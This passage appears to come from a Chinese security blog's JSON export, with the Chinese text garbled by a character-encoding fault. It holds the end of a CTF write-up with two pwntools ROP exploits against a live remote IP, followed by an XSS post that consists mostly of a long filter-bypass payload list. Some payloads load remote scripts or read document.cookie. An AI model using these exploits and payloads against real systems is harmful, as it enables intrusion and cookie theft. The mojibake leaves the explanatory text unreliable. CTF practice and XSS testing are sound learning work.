æ•°ï¼Œè€Œå¯»æ‰¾æ¢…æ£®ç´ æ•°çš„è¿‡ç¨‹å¾ˆå¤æ‚ä¸”æå…¶è€—æ—¶ï¼ˆå‘ç°ç¬¬35-51ä¸ªæ¢…æ£®ç´ æ•°çš„è¿‡ç¨‹ï¼Œä½¿ç”¨å·¨å‹åˆ†å¸ƒå¼ç®—åŠ›éƒ½èŠ±è´¹äº†è¿‘20å¹´ï¼‰ã€‚ å¯¹äºè‘—åæ•°åˆ—ï¼Œå¯ä»¥ä½¿ç”¨åœ¨çº¿æ•´æ•°æ•°åˆ—æŸ¥è¯¢ç½‘ç«™ï¼ˆOEISï¼‰æŸ¥è¯¢ï¼Œæ¢…æ£®ç´ æ•°æ•°åˆ—é‡Œä¸è¶³47ä¸ªï¼Œä¸è¿‡å¯ä»¥ä»æ¢…æ£®æŒ‡æ•°æ•°åˆ—é‡Œå–47ä¸ª $k$ å†è®¡ç®— $2^k-1$ã€‚ 12345678910111213141516import base64_ = 0c = b&quot;...&quot; #base64å¯†æ–‡ç•¥c = base64.b64decode(c).decode().split(&quot;,&quot;)me = [2, 3, 5, 7, 13, 17, 19, 31, 61, 89, 107, 127, 521, 607, 1279, 2203, 2281, 3217, 4253, 4423, 9689, 9941, 11213, 19937, 21701, 23209, 44497, 86243, 110503, 132049, 216091, 756839, 859433, 1257787, 1398269, 2976221, 3021377, 6972593, 13466917, 20996011, 24036583, 25964951, 30402457, 32582657, 37156667, 42643801, 43112609]out = &#x27;&#x27;while _ &lt; len(c): out += chr(int(c[_]) ^ 2**me[_]-1) _ += 1print(out.join([&#x27;flag&#123;&#x27;,&#x27;&#125;&#x27;])) â€‹ Pwn1024_happy_stack happyä¸ºä¸»ï¼Œé¡ºä¾¿ç­¾åˆ° æ— systemæ— /bin/shæ— libcã€‚ éœ€è¦æ»¡è¶³s==&#39;36D&#39;ï¼Œpaddingå¡«å……&#39;36D&#39;.ljust(0x380,&#39;\\x00&#39;)ï¼Œ å¯ä»¥é€šè¿‡putså‡½æ•°æ³„éœ²å‡ºputså‡½æ•°åœ°å€ï¼Œå†åˆ°libcæ•°æ®åº“æŸ¥æ‰¾ä¸‹è½½ç›¸åº”çš„libcï¼Œç”¨one_gadgetæ‰¾åˆ°execve()å‡½æ•°ï¼Œæ ¹æ®åç§»è®¡ç®—åŸºåœ°å€ï¼ŒROPæˆåŠŸã€‚ 1234567891011121314151617181920212223242526272829303132from pwn import *p=remote(&#x27;111.231.70.44&#x27;,28058)#p=process(&#x27;./pwn1&#x27;)elf = ELF(&#x27;./pwn1&#x27;)p.recvuntil(&#x27;qunzhu\\n&#x27;)p.recvline()puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]main_addr=elf.symbols[&#x27;main&#x27;]poprdi_addr=0x400803payload=&#x27;36D&#x27;.ljust(0x380,&#x27;\\x00&#x27;)+&#x27;a&#x27;*8+p64(poprdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)print(p.recvline())p.recvline()puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))#one_gadget libc6_2.27-3ubuntu1_amd64.solibc=ELF(&#x27;./libc6_2.27-3ubuntu1_amd64.so&#x27;)libc_puts=libc.symbols[&#x27;puts&#x27;]libc_execve=libc.symbols[&#x27;execve&#x27;]libc_base=puts_addr-libc_putsexecve_addr=libc_base+0x10a38cpayload=&#x27;36D&#x27;.ljust(0x380,&#x27;\\x00&#x27;)+&#x27;a&#x27;*8+p64(execve_addr)p.sendline(payload)p.interactive() â€‹ 1024_happy_checkinæ— systemæ— /bin/shæ— libcã€‚ å¯ä»¥é€šè¿‡putså‡½æ•°æ³„éœ²å‡ºputså‡½æ•°åœ°å€ï¼Œå†åˆ°libcæ•°æ®åº“æŸ¥æ‰¾ä¸‹è½½ç›¸åº”çš„libcï¼Œç”¨one_gadgetæ‰¾åˆ°execve()å‡½æ•°ï¼Œæ ¹æ®åç§»è®¡ç®—åŸºåœ°å€ï¼ŒROPæˆåŠŸã€‚ 123456789101112131415161718192021222324252627282930from pwn import *p=remote(&#x27;111.231.70.44&#x27;,28041)#p=process(&#x27;./pwn2&#x27;)elf = ELF(&#x27;./pwn2&#x27;)p.recvline()puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]main_addr=elf.symbols[&#x27;main&#x27;]poprdi_addr=0x4006e3poprsi_addr=0x4006e1payload=&#x27;a&#x27;*(0x370+8)+p64(poprdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))#one_gadget libc6_2.27-3ubuntu1_amd64.solibc=ELF(&#x27;./libc6_2.27-3ubuntu1_amd64.so&#x27;)libc_puts=libc.symbols[&#x27;puts&#x27;]libc_execve=libc.symbols[&#x27;execve&#x27;]libc_base=puts_addr-libc_putsexecve_addr=libc_base+0x10a38cpayload=&#x27;a&#x27;*(0x370+8)+p64(execve_addr)p.sendline(payload)p.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"XSS","slug":"web-XSS","date":"2020-10-21T11:47:25.000Z","updated":"2022-03-01T10:39:41.425Z","comments":true,"path":"2020/10/21/web-XSS/","permalink":"https://lazzzaro.github.io/2020/10/21/web-XSS/","excerpt":"","text":"â€‹ è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-site scriptingï¼ŒXSSï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æ¼æ´åœ¨ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„çš„å®¢æˆ·ç«¯ä»£ç ã€‚å½“è¢«æ”»å‡»è€…ç™»é™†ç½‘ç«™æ—¶å°±ä¼šè‡ªåŠ¨è¿è¡Œè¿™äº›æ¶æ„ä»£ç ï¼Œä»è€Œï¼Œæ”»å‡»è€…å¯ä»¥çªç ´ç½‘ç«™çš„è®¿é—®æƒé™ï¼Œå†’å……å—å®³è€…ã€‚ â€‹ å¹³å°https://xss.pt/xss.php â€‹ åŸºæœ¬XSS1234567891011121314151617181920212223242526272829303132333435363738Basic payload&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/scr&lt;script&gt;ipt&gt;&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;Img payload&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)//&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;&quot;&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;&quot;&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;Svg payload&lt;svgonload=alert(1)&gt;&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;&lt;svg onload=alert(1)//&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;&lt;svg id=alert(1) onload=eval(id)&gt;&quot;&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;&quot;&gt;&lt;svg/onload=alert(/XSS/)HTML5ä¸­çš„ä¸€äº›XSS&lt;body onload=alert(/XSS/.source)&gt;&lt;input autofocus onfocus=alert(1)&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea/autofocus/onfocus=alert(1)&gt;&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video/poster/onerror=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;&lt;video src=_ onloadstart=&quot;alert(1)&quot;&gt;&lt;details/open/ontoggle=&quot;alert`1`&quot;&gt;&lt;audio src onloadstart=alert(1)&gt;&lt;marquee onstart=alert(1)&gt;&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt; â€‹ ç»•è¿‡ JSfuckåŠ å¯† &lt;script&gt;[JSfuck Code...]&lt;/script&gt; Base64 &lt;script&gt;eval(atob(&quot;[Base64 Code...]&quot;))&lt;/script&gt; â€‹ Payloadé›†123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525&lt;script&gt;alert(123);&lt;/script&gt;&lt;ScRipT&gt;alert(&quot;XSS&quot;);&lt;/ScRipT&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;script&gt;alert(&quot;hellox worldss&quot;);&lt;/script&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; &lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;; alert(1);&#x27;)alert(1);//&lt;ScRiPt&gt;alert(1)&lt;/sCriPt&gt;&lt;IMG SRC=jAVasCrIPt:alert(&#x27;XSS&#x27;)&gt;&lt;IMG SRC=&#x27;javascript:alert(&#x27;XSS&#x27;);&#x27;&gt;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt; &lt;img src=xss onerror=alert(1)&gt;&lt;iframe %00 src=&quot;&amp;Tab;javascript:prompt(1)&amp;Tab;&quot;%00&gt;&lt;svg&gt;&lt;style&gt;&#123;font-family&amp;colon;&#x27;&lt;iframe/onload=confirm(1)&gt;&#x27;&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;&lt;sVg&gt;&lt;scRipt %00&gt;alert&amp;lpar;1&amp;rpar; &#123;Opera&#125;&lt;img/src=`%00` onerror=this.onerror=confirm(1)&lt;form&gt;&lt;isindex formaction=&quot;javascript&amp;colon;confirm(1)&quot;&lt;img src=`%00`&amp;NewLine; onerror=alert(1)&amp;NewLine;&lt;script/&amp;Tab; src=&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27; /&amp;Tab;&gt;&lt;/script&gt;&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?&lt;iframe/src=&quot;data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;&lt;script /*%00*/&gt;/*%00*/alert(1)/*%00*/&lt;/script /*%00*/&amp;#34;&amp;#62;&lt;h1/onmouseover=&#x27;\\u0061lert(1)&#x27;&gt;%00&lt;iframe/src=&quot;data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;&quot;&gt;&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&#x27;https://www.google.com/&#x27;)&gt;&lt;/script&lt;svg&gt;&lt;script x:href=&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27; &#123;Opera&#125;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;&lt;form&gt;&lt;a href=&quot;javascript:\\u0061lert&amp;#x28;1&amp;#x29;&quot;&gt;X&lt;/script&gt;&lt;img/*%00/src=&quot;worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;&quot;/%00*/onerror=&#x27;eval(src)&#x27;&gt;&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=&quot;javascript&amp;#58;alert(1)&quot;&amp;#11;&amp;#10;&amp;#09;;&gt;&lt;a href=&quot;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/ahttp://www.google&lt;script .com&gt;alert(document.location)&lt;/script&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;&quot;&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;&quot;&gt;XYZ&lt;/a&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt(&#x27;&amp;#49;&#x27;)&lt;style/onload=prompt&amp;#40;&#x27;&amp;#88;&amp;#83;&amp;#83;&#x27;&amp;#41;&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;&quot;date&quot; onfocus=&quot;alert(1)&quot;&gt;&lt;form&gt;&lt;textarea &amp;#13; onkeyup=&#x27;\\u0061\\u006C\\u0065\\u0072\\u0074&amp;#x28;1&amp;#x29;&#x27;&gt;&lt;script /***/&gt;/***/confirm(&#x27;\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450&#x27;)/***/&lt;/script /***/&lt;iframe srcdoc=&#x27;&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;&#x27;&gt;&lt;a href=&quot;javascript:void(0)&quot; onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;&lt;///style///&gt;&lt;span %2F onmousemove=&#x27;alert&amp;lpar;1&amp;rpar;&#x27;&gt;SPAN&lt;img/src=&#x27;http://i.imgur.com/P8mL8.jpg&#x27; onmouseover=&amp;Tab;prompt(1)&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;&#123;-o-link-source&amp;colon;&#x27;&lt;body/onload=confirm(1)&gt;&#x27;&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver &#123;Firefox &amp; Opera&#125;&lt;marquee onstart=&#x27;javascript:alert&amp;#x28;1&amp;#x29;&#x27;&gt;^__^&lt;div/style=&quot;width:expression(confirm(1))&quot;&gt;X&lt;/div&gt; &#123;IE7&#125;&lt;iframe/%00/ src=javaSCRIPT&amp;colon;alert(1)//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type=&#x27;submit&#x27;&gt;///*iframe/src*/&lt;iframe/src=&quot;&lt;iframe/src=@&quot;/onload=prompt(1) /*iframe/src*/&gt;//|\\\\ &lt;script //|\\\\ src=&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27;&gt; //|\\\\ &lt;/script //|\\\\&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;&#123;src&amp;#x3A;&#x27;&lt;style/onload=this.onload=confirm(1)&gt;&#x27;&lt;/font&gt;/&lt;/style&gt;&lt;a/href=&quot;javascript:&amp;#13; javascript:prompt(1)&quot;&gt;&lt;input type=&quot;X&quot;&gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)&lt;/svg&gt;&#x27;&#x27;&lt;svg&gt;&lt;script &#x27;AQuickBrownFoxJumpsOverTheLazyDog&#x27;&gt;alert&amp;#x28;1&amp;#x29; &#123;Opera&#125;&lt;a href=&quot;javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;&quot;&gt;&lt;button&gt;&lt;div onmouseover=&#x27;alert&amp;lpar;1&amp;rpar;&#x27;&gt;DIV&lt;/div&gt;&lt;iframe style=&quot;xg-p:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot;&gt;&lt;a href=&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;X&lt;/a&gt;&lt;embed src=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&lt;object data=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt;&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&#x27;prompt(1)&#x27;&quot;&gt;&lt;%&lt;!--&#x27;%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&lt;iframe/src \\/\\/onload = prompt(1)&lt;iframe/onreadystatechange=alert(1)&lt;svg/onload=alert(1)&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover=&#x27;alert(1)&#x27;&gt;X&lt;/div&gt;http://www.&lt;script&gt;alert(1)&lt;/script .com&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;&lt;svg&gt;&lt;script ?&gt;alert(1)&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;&lt;img src=`xx:xx`onerror=alert(1)&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click&lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1&lt;a href=&quot;data:text/html;base64_,&lt;svg/onload=\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&quot;&gt;X&lt;/a&lt;iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074(&#x27;\\u0061&#x27;) worksinIE&gt;&lt;script&gt;~&#x27;\\u0061&#x27; ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~&#x27;\\u0061&#x27;)&lt;/script U+&lt;script/src=&quot;data&amp;colon;text%2Fj\\u0061v\\u0061script,\\u0061lert(&#x27;\\u0061&#x27;)&quot;&gt;&lt;/script a=\\u0061 &amp; /=%2F&lt;script/src=data&amp;colon;text/j\\u0061v\\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script&lt;object data=javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script&lt;img src ?itworksonchrome?\\/onerror = alert(1)&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe&lt;script x&gt; alert(1) &lt;/script 1=2&lt;div/onmouseover=&#x27;alert(1)&#x27;&gt; style=&quot;x:&quot;&gt;&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt; &lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;&lt;div style=&quot;xg-p:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt;&quot;&gt;&lt;img src=x onerror=window.open(&#x27;https://www.google.com/&#x27;);&gt;&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;&lt;a href=&quot;data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203&quot;&gt;Click Me&lt;/a&gt;&lt;SCRIPT&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)&lt;/SCRIPT&gt;ï¿½;alert(String.fromCharCode(88,83,83))//ï¿½;alert(String.fromCharCode(88,83,83))//ï¿½;alert(String.fromCharCode(88,83,83))//ï¿½;alert(String.fromCharCode(88,83,83))//ï¿½&gt;&lt;/SCRIPT&gt;ï¿½&gt;ï¿½&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;IMG ï¿½ï¿½ï¿½&gt;&lt;SCRIPT&gt;alert(ï¿½XSSï¿½)&lt;/SCRIPT&gt;ï¿½&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&lt;IMG SRC=ï¿½jav ascript:alert(ï¿½XSSï¿½);ï¿½&gt;&lt;IMG SRC=ï¿½jav&amp;#x09;ascript:alert(ï¿½XSSï¿½);ï¿½&gt;&lt;&lt;SCRIPT&gt;alert(ï¿½XSSï¿½);//&lt;&lt;/SCRIPT&gt;%253cscript%253ealert(1)%253c/script%253eï¿½&gt;&lt;sï¿½%2bï¿½cript&gt;alert(document.cookie)&lt;/script&gt;foo&lt;script&gt;alert(1)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;BODY BACKGROUND=ï¿½javascript:alert(ï¿½XSSï¿½)ï¿½&gt;&lt;BODY ONLOAD=alert(ï¿½XSSï¿½)&gt;&lt;INPUT TYPE=ï¿½IMAGEï¿½ SRC=ï¿½javascript:alert(ï¿½XSSï¿½);ï¿½&gt;&lt;IMG SRC=ï¿½javascript:alert(ï¿½XSSï¿½)ï¿½&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;javascript:alert(&quot;hellox worldss&quot;)&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;img 